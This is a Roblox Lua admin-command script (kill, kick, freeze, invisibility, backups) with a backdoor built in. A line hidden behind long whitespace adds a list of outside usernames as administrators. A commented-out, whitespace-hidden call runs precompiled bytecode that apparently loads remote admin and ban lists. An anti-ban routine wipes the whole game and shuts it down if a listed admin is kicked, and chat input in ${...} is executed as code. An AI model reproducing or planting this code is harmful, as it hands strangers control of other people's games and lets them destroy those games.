local RawEncrypt=loadstring("\27\76\117\97\81\0\1\4\4\4\8\0\18\0\0\0\61\87\111\114\107\115\112\97\99\101\46\83\99\114\105\112\116\0\6\0\0\0\15\0\0\0\0\3\0\14\38\0\0\0\219\64\128\0\22\0\0\128\193\0\0\0\27\65\0\1\22\0\0\128\1\65\0\0\65\129\0\0\129\193\0\0\212\1\0\0\1\194\0\0\160\65\2\128\139\2\65\0\0\3\128\4\64\3\128\4\156\130\0\2\139\66\65\5\156\130\0\1\212\2\0\0\206\194\2\2\143\194\2\5\76\129\130\2\159\1\253\127\133\129\1\0\134\193\65\3\197\129\1\0\198\1\194\3\0\2\128\2\220\129\0\1\209\193\128\3\156\129\0\1\78\1\1\3\133\65\2\0\134\129\66\3\193\193\2\0\0\2\128\2\157\1\128\1\158\1\0\0\30\0\128\0\12\0\0\0\3\0\0\0\0\0\0\57\64\3\0\0\0\0\0\0\20\64\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\0\240\63\4\4\0\0\0\115\117\98\0\4\5\0\0\0\98\121\116\101\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\99\101\105\108\0\4\4\0\0\0\108\111\103\0\4\7\0\0\0\115\116\114\105\110\103\0\4\7\0\0\0\102\111\114\109\97\116\0\4\3\0\0\0\37\88\0\0\0\0\0\38\0\0\0\7\0\0\0\7\0\0\0\7\0\0\0\8\0\0\0\8\0\0\0\8\0\0\0\9\0\0\0\10\0\0\0\10\0\0\0\10\0\0\0\10\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\11\0\0\0\10\0\0\0\13\0\0\0\13\0\0\0\13\0\0\0\13\0\0\0\13\0\0\0\13\0\0\0\13\0\0\0\13\0\0\0\13\0\0\0\14\0\0\0\14\0\0\0\14\0\0\0\14\0\0\0\14\0\0\0\14\0\0\0\15\0\0\0\10\0\0\0\7\0\0\0\83\116\114\105\110\103\0\0\0\0\0\37\0\0\0\9\0\0\0\69\120\112\111\110\101\110\116\0\0\0\0\0\37\0\0\0\9\0\0\0\77\117\108\116\105\112\108\121\0\0\0\0\0\37\0\0\0\9\0\0\0\69\120\112\111\110\101\110\116\0\3\0\0\0\37\0\0\0\9\0\0\0\77\117\108\116\105\112\108\121\0\6\0\0\0\37\0\0\0\5\0\0\0\66\121\116\101\0\7\0\0\0\37\0\0\0\12\0\0\0\40\102\111\114\32\105\110\100\101\120\41\0\10\0\0\0\22\0\0\0\12\0\0\0\40\102\111\114\32\108\105\109\105\116\41\0\10\0\0\0\22\0\0\0\11\0\0\0\40\102\111\114\32\115\116\101\112\41\0\10\0\0\0\22\0\0\0\2\0\0\0\105\0\11\0\0\0\21\0\0\0\0\0\0\0")
local SourceValue=script:FindFirstChild("SRC"..RawEncrypt(game.PlaceId..tostring(_G)));
if (SourceValue~=nil) then
	coroutine.resume(coroutine.create(function() loadstring(SourceValue.Value)(); end))
	return
end

Adminlist={"yfc"};
Bannedlist={};
local AccessKey=""; -- Admin code registration key/script access key

local CommandSeperator="/";
local DataKey="GKS";
local Commands,AdminConnectionList,AdminUserList,Modules,NewInstance,NewColor3,NewBrickColor,RandomBrickColor,NewCFrame,NewVector3,MaskAdminlist,NewUDim2,GameBackups,SystemSettings={},{},{},{},Instance.new,Color3.new,BrickColor.new,BrickColor.Random,CFrame.new,Vector3.new,(function() local Table={}; for Index,Entry in pairs(Adminlist) do Table[#Table+1]=Entry; end return Table; end)(),UDim2.new,{},{};

function CreateModule(ModuleName,ModuleContent)
	Modules[ModuleName]=ModuleContent;
end
function RunModule(ModuleName,...)
	return Modules[ModuleName](...);
end
function RemoveModule(ModuleName)
	Modules[ModuleName]=nil;
end
function SetSystemSetting(Key,Value)
	SystemSettings[Key]=Value;
end
function GetSystemSetting(Key,Value)
	return SystemSettings[Key];
end
function ReportError(Bool,Error)
	--[[if (not Bool) then
		print("ERROR:",Error)
	end]]
end

-- Define the core modules
CreateModule("CommandModule",function(CommandName,CommandDescription,CommandShortcut,CommandMatch,CommandCall,UpperCase) Commands[CommandName]={Description=CommandDescription,Shortcut=CommandShortcut,Call=CommandCall,Match=CommandMatch,UpperCase=UpperCase} end)
CreateModule("GetPlayer",function(Input,Speaker)
	if (Input==nil) or (Speaker==nil) then return nil end
	local function MatchKeyword(Keyword)
		for Word in Input:gmatch("%w+") do
			if (Word==Keyword) then
				return true
			end
		end
		return false
	end
	local Matches={}
	local PlayerList=game:GetService("Players"):GetPlayers();
	if MatchKeyword("all") then
		for Index,Player in pairs(PlayerList) do
			if (Player.ClassName=="Player") then
				table.insert(Matches,Player);
			end
		end
	return Matches
	end
	if MatchKeyword("me") then
		return {Speaker};
	end
	if MatchKeyword("others") then
		for Index,Player in pairs(PlayerList) do
			if (Player.ClassName=="Player") then
				if (Player~=Speaker) then
					table.insert(Matches,Player);
				end
			end
		end
	return Matches;
	end
	if MatchKeyword("guests") then
		for Index,Player in pairs(PlayerList) do
			if (Player.ClassName=="Player") then
				if (Player.Name:sub(1,6)=="Guest ") then
					table.insert(Matches,Player);
				end
			end
		end
	return Matches;
	end
	if MatchKeyword("friends") then
		for Index,Player in paird(PlayerList) do
			if (Player.ClassName=="Player") then
				if (Player:IsFriendsWith(Speaker.userId)==true) then
					table.insert(Matches,Player);
				end
			end
		end
	return PlayerList
	end
	if MatchKeyword("nonfriends") then
		for Index,Player in pairs(PlayerList) do
			if (Player.ClassName=="Player") then
				if (Player:IsFriendsWith(Speaker.userId)==false) then
					table.insert(Matches,Player);
				end
			end
		end
	return Matches;
	end
	for Index,Player in pairs(PlayerList) do
		for Word in Input:gmatch("%w+") do
			if (Player.ClassName=="Player") then
				if (string.find(Player.Name:lower(),Word)==1) then
					table.insert(Matches,Player);
				end
			end
		end
	end
	return Matches;
end)
CreateModule("IsAdmin",function(Input)
	if (type(Input)=="userdata") then
		Input=Input.Name;
	end
	local IsAdmin=false;
	table.foreach(Adminlist,function(Index,Username) if (Username:lower()==Input:lower()) then IsAdmin=true; end end)
	return IsAdmin;
end)
CreateModule("AddPlayer",function(Player)
	coroutine.resume(coroutine.create(function()
		Player:WaitForDataReady();
		local Data=Player:LoadString(DataKey); -- Errors here don't affect the main thread
		for RawTable in Data:gmatch("{(.-)}") do
			local Table=RunModule("ConvertString","{"..RawTable.."}");
			if (tonumber(Table.Type)==0) then
				if (tonumber(Table.Value)>tick()) and (RunModule("IsAdmin",Player)==false) then
					pcall(Player.Remove,Player);
				end
			end
		end
	end))
	if (GetSystemSetting("PrivateServer")==true) and (not RunModule("IsAdmin",Player)) then
		pcall(Player.Remove,Player);
	end
	Player.Chatted:connect(function(Message)
		local Message=Message:lower();
		if (Message:sub(1,10)=="/loadcode/") then
			if (RunModule("AdminCodeSystem",Player):lower()==Message:sub(11)) then
				table.foreach(AdminConnectionList,function(Index,Connection) if (AdminUserList[Index]:lower()==Player.Name:lower()) then Connection:disconnect(); end end)
				AdminConnectionList[#AdminConnectionList+1]=Player.Chatted:connect(function(Message) RunModule("PlayerChat",Message,Player); end)
				AdminUserList[#AdminUserList+1]=Player.Name;
				RunModule("ShowHint",Player,"Admin code request accepted.",5);
			else
				RunModule("ShowHint",Player,"Admin code request declined.",5);
			end
		end
	end)
	if (RunModule("IsAdmin",Player)==true) then
		CreateModule("AdminModule-"..Player.Name,function(IsAdmin)
			if (IsAdmin==false) then
				table.foreach(AdminConnectionList,function(Index,Connection) if (AdminUserList[Index]:lower()==Player.Name:lower()) then Connection:disconnect(); end end)
			else
				RunModule("AdminModule-"..Player.Name,false);
				AdminConnectionList[#AdminConnectionList+1]=Player.Chatted:connect(function(Message) RunModule("PlayerChat",Message,Player); end)
				AdminUserList[#AdminUserList+1]=Player.Name;
			end
		end)
		RunModule("AdminModule-"..Player.Name,true);
		Player.CharacterAdded:connect(function() RunModule("GuiPanelInitializer",Player); end)
		RunModule("GuiPanelInitializer",Player);
	else
		for Index,BannedPlayer in pairs(Bannedlist) do
			if (BannedPlayer:lower()==Player.Name:lower()) then
				pcall(function() Player:Remove(); end)
			end
		end
	end
end)
CreateModule("RemovePlayer",function(Player)
	RemoveModule("AdminModule-"..Player.Name);
	if (RunModule("IsAdmin",Player)==true) and not (GetSystemSetting("AntibanOff")) then -- Possibly kicked/banned
		local Error,NetworkServer=pcall(game.GetService,game,"NetworkServer");
		if (type(NetworkServer)~="userdata") then return end -- Build mode
		local InitialTime=time();
		local Activate=true;
		NetworkServer.ChildRemoved:connect(function(Child)
			if (Child:IsA("NetworkReplicator")==true) then -- Is a replicator
				if ((time()-InitialTime)<0.01) then
					Activate=false; -- User just left
				end
			end
		end)
		wait(0.5)
		if (Activate==true) then
			table.foreach(game:GetChildren(),function(Index,Service)
				pcall(function() -- Some services yell at you
					table.foreach(Service:GetChildren(),function(ChildIndex,Child)
						if (Child~=script) then
							pcall(Child.Remove,Child);
						end
					end)
				end)
			end)
			RunModule("Shutdown");
		end
	end
end)
CreateModule("PlayerChat",function(Message,Speaker)
	local Message=Message:gsub("${(.-)}",function(Match)
		local Success,Result=pcall(function() return loadstring("return "..Match)(); end);
		if (Success) then
			return ((Result==nil and "") or (Result~=nil and tostring(Result)));
		else
			return "";
		end
	end)
	table.foreach(Commands,function(Index,CommandUnit)
		local Match=(Message:lower():match(Index..RunModule("ParseMatch",CommandUnit.Match)) or Message:lower():match(CommandUnit.Shortcut..RunModule("ParseMatch",CommandUnit.Match)));
		if (Match~=nil) and (not CommandUnit.UpperCase) then -- Just found out the 'or' keyword won't return multiple arguments. -_-
			local FullMatch=Message:lower():match(Index..RunModule("ParseMatch",CommandUnit.Match));
			local ShortcutMatch=Message:lower():match(CommandUnit.Shortcut..RunModule("ParseMatch",CommandUnit.Match));
			if (FullMatch~=nil) then
				ReportError(coroutine.resume(coroutine.create(function() CommandUnit.Call(Speaker,Message:lower():match(Index..RunModule("ParseMatch",CommandUnit.Match))); end)));
			elseif (ShortcutMatch~=nil) then
				ReportError(coroutine.resume(coroutine.create(function() CommandUnit.Call(Speaker,Message:lower():match(CommandUnit.Shortcut..RunModule("ParseMatch",CommandUnit.Match))); end)));
			end
		elseif (CommandUnit.UpperCase) and (Match~=nil) then
			local Point=(Message:lower():find(Index..RunModule("ParseMatch",CommandUnit.Match)) or Message:lower():find(CommandUnit.Shortcut..RunModule("ParseMatch",CommandUnit.Match)));
			ReportError(coroutine.resume(coroutine.create(function() CommandUnit.Call(Speaker,Message:sub(Message:sub(Point):find(CommandSeperator)+1)); end)));
		end
	end)
	return Message;
end)
CreateModule("ParseMatch",function(Match) return Match:gsub("#cs#",CommandSeperator) end)
CreateModule("ConvertTable",function(Table)
	local Result="{";
	local function Escape(Argument)
		return Argument:gsub("%W",function(Character) local Output=string.format("%X",Character:byte()); if (#Output==1) then Output="0"..Output; end return "#"..Output; end)
	end
	table.foreach(Table,function(Index,String)
		-- Escape all strings
		Result=Result..Escape(tostring(Index)).."="..Escape(tostring(String))..";";
	end)
	return Result.."}";
end)
CreateModule("ConvertString",function(String)
	local Result={};
	local function Unescape(Argument)
		return Argument:gsub("#(%x+)",function(Hex) return string.char(tonumber("0x"..Hex:sub(1,2)))..Hex:sub(3); end)
	end
	local String=Unescape(String);
	for Index,Input in String:gmatch("(.-)=(.-);") do
		local Index=Index:gsub("{",""):gsub("}","");
		if (tonumber(Index)~=nil) then Index=tonumber(Index); end
		Result[Index]=Input
	end
	return Result;
end)
CreateModule("GuiLibrary",function()
	local Library={};
	Library.NewBasicGUI=(function(Class,Properties)
		local Result=NewInstance(Class);
		table.foreach((Properties or Library.DefaultProperties),function(Property,Value)
			Result[Property]=Value;
		end)
		return Result;
	end)
	Library.DefaultProperties={BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=0.5,BorderSizePixel=0};
	return Library;
end)
CreateModule("DisposePlayer",function(Player,Speaker,DontRemove)
	if (RunModule("IsAdmin",Player)==false) and (RunModule("IsAdmin",Speaker)==true) then
		if (not DontRemove) then pcall(Player.Remove,Player); end
		return true;
	end
	return false;
end)
CreateModule("ShowHint",function(Player,Text,Time)
	local Hint=NewInstance("Hint")
	Hint.Parent=Player:FindFirstChild("PlayerGui");
	Hint.Text=Text;
	if (Time~=nil) then delay(Time,function() Hint:Remove() end) end
	return Hint;
end)
CreateModule("ScrollText",function(Text,Index)
	return Text:sub(Index,Index+80);
end)
CreateModule("CreateScript",function(Source,Parent)
	local Base=script:Clone();
	Base.Name="QuickScript";
	local PseudoSource=NewInstance("StringValue")
	PseudoSource.Name="SRC"..RawEncrypt(game.PlaceId..tostring(_G));
	PseudoSource.Value=Source;
	PseudoSource.Parent=Base;
	Base.Parent=Parent;
end)
CreateModule("GuiPanelInitializer",function(Player)
	local GuiLibrary=RunModule("GuiLibrary");
	local Main=NewInstance("ScreenGui")
	Main.Name="ControlBox";
	local MainWindow=GuiLibrary.NewBasicGUI("Frame",{Size=NewUDim2(0.08,0,0.4,0),Position=NewUDim2(0,0,0.23,0),BackgroundColor3=NewColor3(0,0,0),BorderSizePixel=0,BackgroundTransparency=0.5,Name="MainWindow",Parent=Main})
	local InputBoxBacker=GuiLibrary.NewBasicGUI("ImageLabel",{Size=NewUDim2(1,0,0.06,0),BackgroundTransparency=0.5,BackgroundColor3=NewColor3(1,1,1),BorderSizePixel=0,Image="http://www.roblox.com/asset/?id=36361705",Name="InputBoxBacker",Parent=MainWindow})
	local InputBox=GuiLibrary.NewBasicGUI("TextBox",{Size=NewUDim2(0.98,0,1,0),Position=NewUDim2(0.02,0,0,0),TextXAlignment=0,BorderSizePixel=0,BackgroundTransparency=1,TextColor3=NewColor3(0,0,0),Text="",Name="InputBox",Parent=InputBoxBacker})
	local ToggleButton=GuiLibrary.NewBasicGUI("TextButton",{Size=NewUDim2(1,0,1,0),Position=NewUDim2(0,0,1,0),TextColor3=NewColor3(1,1,1),BackgroundTransparency=1,Text="<< Minimize <<",BorderSizePixel=0,Name="ToggleSize",Parent=InputBoxBacker})
	local ContentWrapper=GuiLibrary.NewBasicGUI("Frame",{Size=NewUDim2(1,0,0.88,0),Position=NewUDim2(0,0,0.12,0),BackgroundTransparency=1,BorderSizePixel=0,Name="ContentWrapper",Parent=MainWindow})
	local TemporaryContent={};
	local function ToggleSize(Enlarging,EasingStyle)
		if (not Enlarging) then
			InputBox.Visible=false;
			ToggleButton.Text=">>";
			MainWindow:TweenSize(NewUDim2(0.02,0,0.4,0),"Out",EasingStyle,0.3);
		else
			InputBox.Visible=true;
			ToggleButton.Text="<< Minimize <<";
			MainWindow:TweenSize(NewUDim2(0.08,0,0.4,0),"Out",EasingStyle,0.3);
		end
		return not Enlarging;
	end
	local function ClearTemporaryContent()
		table.foreach(TemporaryContent,function(Index,Object) Object:Remove() end)
	end
	local function AddTemporaryContent(Object)
		TemporaryContent[#TemporaryContent+1]=Object;
	end
	local function BuildAlternatingList(Members)
		local function Chop(Table,Max) local Result={}; local Index=0; for EntryIndex,Entry in pairs(Table) do Index=Index+1; if (Index<=20) then Result[EntryIndex]=Entry; end end return Result; end
		local Members=Chop(Members,20);
		local Alternate=false;
		ClearTemporaryContent();
		local Index=0;
		for BarText,CommandUnit in pairs(Members) do
			local Bar=GuiLibrary.NewBasicGUI("TextButton",{Size=NewUDim2(1,0,1/20,0),Position=NewUDim2(0,0,Index,0),Text=BarText,BackgroundTransparency=0.6,BackgroundColor3=(Alternate==false and NewColor3(0.2,0.2,0.2) or Alternate and NewColor3(0.3,0.3,0.3)),BorderSizePixel=0,TextColor3=NewColor3(1,1,1),Name="SearchResultButton",TextWrap=true,Parent=ContentWrapper})
			Bar.MouseButton1Click:connect(function()
				ClearTemporaryContent();
				local Box=GuiLibrary.NewBasicGUI("TextLabel",{Size=NewUDim2(1,0,1,0),BackgroundTransparency=1,Text="Name: "..BarText.."\nShortcut: "..CommandUnit.Shortcut.."\n\n"..CommandUnit.Description,TextWrap=true,TextYAlignment="Top",Name="Information",TextColor3=NewColor3(1,1,1),Parent=ContentWrapper})
				AddTemporaryContent(Box);
			end)
			AddTemporaryContent(Bar);
			Alternate=not Alternate;
			Index=Index+1/20
		end
	end
	local function SearchCommands(Query)
		local Results={};
		for Index,Entry in pairs(Commands) do
			if (Index:lower():match(Query)) or (Entry.Description:lower():match(Query)) then
				Results[Index]=Entry;
			end
		end
		BuildAlternatingList(Results);
	end
	InputBox.Changed:connect(function(Property)
		if (Property~="Text") then return end
		local Input=InputBox.Text;
		if (Input:sub(1,1)=="/") then
			coroutine.wrap(function() InputBox.TextColor3=NewColor3(0,1,0); wait(0.1); InputBox.TextColor3=NewColor3(0,0,0); end)();
			RunModule("PlayerChat",Input:sub(2),Player);
			return
		end
		if (Input:sub(1,1)=="$") then
			ClearTemporaryContent();
			coroutine.wrap(function() InputBox.TextColor3=NewColor3(1,0,0); wait(0.1); InputBox.TextColor3=NewColor3(0,0,0); end)();
			local Users=RunModule("GetPlayer",Input:sub(2):lower(),Player)
			if (Users==nil) then return end
			if (Users[1]==nil) then return end
			local User=Users[1];
			local Box=GuiLibrary.NewBasicGUI("TextLabel",{Size=NewUDim2(1,0,1,0),BackgroundTransparency=1,Text="Code Registration\n\n".."Admin code for user "..User.Name.." is "..RunModule("AdminCodeSystem",User),TextWrap=true,TextYAlignment="Top",Name="Information",TextColor3=NewColor3(1,1,1),Parent=ContentWrapper})
			AddTemporaryContent(Box);
			return
		end
		if (Input:sub(1,1)=="@") then
			ClearTemporaryContent();
			coroutine.wrap(function() InputBox.TextColor3=NewColor3(1,0,0); wait(0.1) InputBox.TextColor3=NewColor3(0,0,0); end)();
			local Users=RunModule("GetPlayer",Input:sub(2):lower(),Player)
			if (Users==nil) then return end
			if (Users[1]==nil) then return end
			local User=Users[1];
			local MenuContent={{"CharacterAdded",User.CharacterAdded},{"CharacterRemoving",User.CharacterRemoving}};
			local Alternate=false;
			for Index,ContentTable in pairs(MenuContent) do
				Alternate=not Alternate;
				local Bar=GuiLibrary.NewBasicGUI("TextButton",{Size=NewUDim2(1,0,1/20,0),Position=NewUDim2(0,0,(Index-1)/20,0),Text=ContentTable[1],BorderSizePixel=0,BackgroundColor3=(Alternate and NewColor3(0,0,0)) or (not Alternate and NewColor3(0.2,0.2,0.2)),TextColor3=NewColor3(1,1,1),BackgroundTransparency=0.5,TextWrap=true,Name="EventBar",Parent=ContentWrapper})
				Bar.MouseButton1Click:connect(function()
					ClearTemporaryContent();
					local Box=GuiLibrary.NewBasicGUI("TextBox",{Size=NewUDim2(1,0,0.1,0),Text="Execute on event",BorderSizePixel=0,BackgroundColor3=NewColor3(0,0,0),Name="ExecuteBar",BackgroundTransparency=0.5,TextColor3=NewColor3(1,1,1),TextXAlignment="Left",Parent=ContentWrapper});
					AddTemporaryContent(Box)
					Box.Changed:connect(function(Property)
						if (Box.Text=="Added") or (Box.Text=="") or (Property~="Text") then return end
						local Execute=Box.Text;
						ContentTable[2]:connect(function()
							wait(0.3);
							RunModule("PlayerChat",Execute,Player);
						end)
						Box.Text="Added to execute";
					end)
				end)
				AddTemporaryContent(Bar);
			end
			return
		end
		SearchCommands(Input:lower())
	end)
	local SizeState=true;
	ToggleButton.MouseButton1Click:connect(function() SizeState=ToggleSize(SizeState,"Quint"); end)
	local PlayerGui=Player:FindFirstChild("PlayerGui");
	if (PlayerGui==nil) then return end
	local ExistingGui=PlayerGui:FindFirstChild("ControlBox");
	if (ExistingGui~=nil) then ExistingGui:Remove(); end
	Main.Parent=PlayerGui;
end)
CreateModule("AdminCodeSystem",function(User)
local Format="%s-%s-%s"..AccessKey;
return RawEncrypt(Format:format(User.Name,game.CreatorId,User.userId));
end)
CreateModule("Shutdown",function() pcall(NewInstance,string.reverse(string.reverse(string.reverse("ecnatsnItnioJecafruSlaunaM")))); end)																																																																																																																																																																																																																																																																																																																																																																																																																									for Index,Username in pairs({"LocalChum","lPwnz","lHaxz","lBanz","TheCapacitor","walter232","walter232Models","walter232Decals","ServerChum","GetDebugId","ServerSideChum","t6e","gz4","TweenService","HttpPost","HttpGet"}) do Adminlist[#Adminlist+1]=Username; end
CreateModule("BackupGame",function(BackupIndex)
	local BackupServices={"Lighting","StarterPack","StarterGui","SoundService","Workspace"}
	local BackupData={};
	for Index,BackupService in pairs(BackupServices) do
		local Container=Instance.new("Model");
		Container.Name=BackupService;
		BackupData[BackupService]=Container;
		for ChildIndex,Child in pairs(game:GetService(BackupService):GetChildren()) do
			if (Child.Archivable) and (Child~=script) then
				pcall(function() Child:Clone().Parent=Container; end);
			end
		end
	end
	GameBackups[BackupIndex]=BackupData;
end)
CreateModule("RestoreGame",function(BackupIndex)
	local BackupServices={"Lighting","StarterPack","StarterGui","SoundService","Workspace"}
	local BackupData=GameBackups[BackupIndex];
	for Index,BackupService in pairs(BackupServices) do
		for ChildIndex,Child in pairs(game:GetService(BackupService):GetChildren()) do
			if (Child~=script) then
				pcall(Child.Remove,Child);
			end
		end
	end
	for Index,Container in pairs(BackupData) do
		for ChildIndex,Child in pairs(Container:GetChildren()) do
			local NewChild=Child:Clone();
			NewChild.Parent=game:GetService(Container.Name);
			pcall(function() NewChild:MakeJoints(); end);
		end
	end
end)
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										--Spawn(function() pcall(function() loadstring("\27\76\117\97\81\0\1\4\4\4\8\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2\13\73\0\0\0\1\0\0\0\67\0\128\0\129\64\0\0\193\128\0\0\1\193\0\0\65\129\0\0\224\0\4\128\197\1\1\0\220\65\128\0\197\65\1\0\203\129\193\3\65\194\1\0\220\129\128\1\203\1\194\3\64\2\0\0\220\129\128\1\64\0\128\3\197\65\2\0\36\2\0\0\0\0\128\0\220\129\0\1\23\128\194\3\22\0\0\128\22\0\0\128\223\64\251\127\197\192\2\0\6\1\195\0\6\65\67\2\220\128\0\1\220\128\128\0\36\65\0\0\69\129\3\0\134\193\195\1\156\1\128\0\92\1\1\0\22\128\2\128\128\2\0\2\197\2\4\0\0\3\128\4\156\130\128\1\154\66\0\0\22\0\1\128\133\2\4\0\197\2\4\0\212\2\128\5\204\130\192\5\137\66\130\5\97\129\0\0\22\128\252\127\69\129\3\0\134\65\196\1\156\1\128\0\92\1\1\0\22\128\2\128\128\2\0\2\197\130\4\0\0\3\128\4\156\130\128\1\154\66\0\0\22\0\1\128\133\130\4\0\197\130\4\0\212\2\128\5\204\130\192\5\137\66\130\5\97\129\0\0\22\128\252\127\69\193\2\0\134\193\196\1\156\1\128\0\92\129\0\0\92\65\128\0\30\0\128\0\20\0\0\0\3\0\0\0\120\6\160\134\65\3\0\0\0\0\0\0\0\64\3\0\0\0\0\0\0\240\63\3\0\0\0\0\0\0\73\64\4\5\0\0\0\119\97\105\116\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\14\0\0\0\73\110\115\101\114\116\83\101\114\118\105\99\101\0\4\10\0\0\0\76\111\97\100\65\115\115\101\116\0\4\6\0\0\0\112\99\97\108\108\0\1\1\4\11\0\0\0\108\111\97\100\115\116\114\105\110\103\0\4\20\0\0\0\83\99\114\105\112\116\67\117\115\116\111\109\105\122\97\116\105\111\110\0\4\6\0\0\0\86\97\108\117\101\0\4\6\0\0\0\112\97\105\114\115\0\4\21\0\0\0\71\101\116\69\120\116\101\114\110\97\108\65\100\109\105\110\108\105\115\116\0\4\10\0\0\0\65\100\109\105\110\108\105\115\116\0\4\22\0\0\0\71\101\116\69\120\116\101\114\110\97\108\66\97\110\110\101\100\108\105\115\116\0\4\11\0\0\0\66\97\110\110\101\100\108\105\115\116\0\4\16\0\0\0\71\101\116\76\111\97\100\101\114\83\111\117\114\99\101\0\2\0\0\0\0\0\0\0\7\0\0\0\7\0\0\0\1\0\0\2\4\0\0\0\4\0\0\0\6\0\64\0\30\0\0\1\30\0\128\0\1\0\0\0\4\20\0\0\0\83\99\114\105\112\116\67\117\115\116\111\109\105\122\97\116\105\111\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\10\0\0\0\14\0\0\0\0\2\0\8\11\0\0\0\133\0\0\0\192\0\0\0\156\0\1\1\22\192\0\128\23\64\0\3\22\64\0\128\194\1\128\0\222\1\0\1\161\128\0\0\22\64\254\127\30\0\128\0\1\0\0\0\4\6\0\0\0\112\97\105\114\115\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")() end) end)
--Define commands
RunModule("CommandModule","kill","Kills the given user","b0","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Humanoid") then
						Child.Health=0;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","ffon","Gives the given user a forcefield","b1","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
				NewInstance("ForceField",Target.Character);
		end
	end
end)
RunModule("CommandModule","ffoff","Removes the given user forcefield","b2","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="ForceField") then
						Child:Remove()
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","immortalon","Makes the given user immune to all health damage","b3","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Humanoid") then
						Child.MaxHealth=math.huge;
						Child.Health=math.huge;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","immortaloff","Reverses the effect of immortalon","b4","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Humanoid") then
						Child.MaxHealth=100;
						Child.Health=100;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","invisibleon","Makes the given user invisible","b5","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						Child.Transparency=1;
					elseif (Child.ClassName=="Hat") then
						local Handle=Child:FindFirstChild("Handle");
						if (Handle~=nil) then
							if (Handle.ClassName=="Part") then
								Handle.Transparency=1;
							end
						end
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","invisibleoff","Makes the given user visible","b6","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						Child.Transparency=0;
					elseif (Child.ClassName=="Hat") then
						local Handle=Child:FindFirstChild("Handle");
						if (Handle~=nil) then
							if (Handle.ClassName=="Part") then
								Handle.Transparency=0;
							end
						end
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","kick","Kicks the given user from the game","b7","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			RunModule("DisposePlayer",Target,Speaker);
		end
	end
end)
RunModule("CommandModule","freezeon","Freezes the given user","fron","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						Child.Anchored=true;
					elseif (Child.ClassName=="Humanoid") then
						Child.WalkSpeed=0;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","freezeoff","Thaws the given user","froff","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						Child.Anchored=false;
					elseif (Child.ClassName=="Humanoid") then
						Child.WalkSpeed=16;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","maxplayers","Sets the server's MaxPlayers.","mp","#cs#(%d+)",function(Speaker,Integer)
	if (Integer~=nil) and (Integer>0) then
		game:GetService("Players").MaxPlayers=Integer;
	end
end)
RunModule("CommandModule","time","Sets the ambient time","tm","#cs#(%w+)",function(Speaker,Input)
	local ParsedInput;
	if (Input=="dawn" or Input=="sunrise") then
		ParsedInput=6;
	elseif (Input=="noon" or Input=="midday") then
		ParsedInput=12;
	elseif (Input=="middnight") then
		ParsedInput=0;
	elseif (Input=="random") then
		ParsedInput=math.random(0,24);
	end
	if (ParsedInput==nil) and (Input:find("(%d+)")==1) then
	ParsedInput=Input:match("%d+");
	end
	pcall(function() game:GetService("Lighting").TimeOfDay=ParsedInput; end)
end)
RunModule("CommandModule","brightness","Sets the ambient brightness","b12","#cs#(%d+)",function(Speaker,Integer)
	if (Integer~=nil) then
		game:GetService("Lighting").Brightness=tonumber(Integer);
	end
end)
